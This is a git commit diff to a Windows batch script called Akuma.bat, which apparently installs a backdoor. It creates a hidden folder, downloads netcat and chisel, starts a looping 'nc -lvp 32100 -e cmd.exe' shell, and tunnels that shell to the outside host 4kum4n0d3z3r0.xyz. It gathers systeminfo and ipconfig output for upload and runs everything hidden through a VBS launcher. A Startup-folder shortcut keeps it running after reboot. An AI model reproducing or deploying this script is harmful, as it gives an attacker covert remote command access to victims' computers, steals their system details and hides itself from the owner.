02ed337034ed5c8a9a0c2657707469fb53d9424a
l_ <112792604+l-urk@users.noreply.github.com>
2023-10-17 12:42:36 -0700

    Update Akuma.bat

--- Akuma.bat
+++ Akuma.bat
@@ -6,11 +6,11 @@ mkdir %homedrive%\Akuma
 attrib +h %homedrive%\Akuma
 cd %homedrive%\Akuma
 mkdir %homedrive%\Akuma\ncat-portable-5.59BETA1
-mkdir %homedrive%\Akuma\nc
+mkdir %homedrive%\Akuma\nc 
 curl -L https://github.com/l-urk/Akuma/raw/main/ncat.exe > %homedrive%\Akuma\ncat-portable-5.59BETA1\ncat.exe
 curl -L https://github.com/l-urk/Akuma/raw/main/nc.exe > %homedrive%\Akuma\nc\nc
 curl -L https://github.com/l-urk/Akuma/raw/main/libcrypto-3.dll > %homedrive%\Akuma\nc\libcrypto-3.dll
-curl -L https://github.com/fatedier/frp/releases/download/v0.52.1/frp_0.52.1_windows_amd64.zip > frp_0.52.1_windows_amd64.zip
+curl -L https://github.com/l-urk/Akuma/raw/main/chisel.exe > chisel.exe
 echo del %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
 echo systeminfo ^>^> %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
 echo ipconfig /all ^>^> %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
@@ -18,17 +18,13 @@ echo curl -X POST -H "Content-Type: multipart/form-data" -F "file=@%homedrive%\A
 echo :start >> %homedrive%\Akuma\ncat.bat
 echo %homedrive%\Akuma\nc\nc.exe -lvp 32100 -e cmd.exe >> %homedrive%\Akuma\ncat.bat
 echo goto start >> %homedrive%\Akuma\ncat.bat
-echo :start >> %homedrive%\Akuma\frpc.bat
-echo cd %homedrive%\Akuma\frp_0.52.1_windows_amd64 >> %homedrive%\Akuma\frpc.bat
-echo %homedrive%\Akuma\frp_0.52.1_windows_amd64\frpc.exe >> %homedrive%\Akuma\frpc.bat
-echo goto start >> %homedrive%\Akuma\frpc.bat
+echo :start >> %homedrive%\Akuma\chisel.bat
+echo %homedrive%\Akuma\chisel.exe client 127.0.0.1:32100 4kum4n0d3z3r0.xyz:32101 >> %homedrive%\Akuma\chisel.bat
+echo goto start >> %homedrive%\Akuma\chisel.bat
 echo Set objShell = CreateObject("WScript.Shell") >> %homedrive%\Akuma\Akuma.vbs
 echo objShell.Run "%homedrive%\Akuma\ncat.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
-echo objShell.Run "%homedrive%\Akuma\frpc.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
+echo objShell.Run "%homedrive%\Akuma\chisel.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
 echo objShell.Run "%homedrive%\Akuma\zonbi.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
-tar -xf frp_0.52.1_windows_amd64.zip
-echo serverAddr = "4kum4n0d3z3r0.xyz" >> %homedrive%\Akuma\frp_0.52.1_windows_amd64\frpc.ini
-echo serverPort = 32101 >> %homedrive%\Akuma\frp_0.52.1_windows_amd64\frpc.ini
 tar -xf ncat-portable-5.59BETA1.zip
 echo y| del "%AppData%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Akuma.lnk"
 powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\Akuma.lnk');$s.TargetPath='%homedrive%\Akuma\Akuma.vbs';$s.Save()"
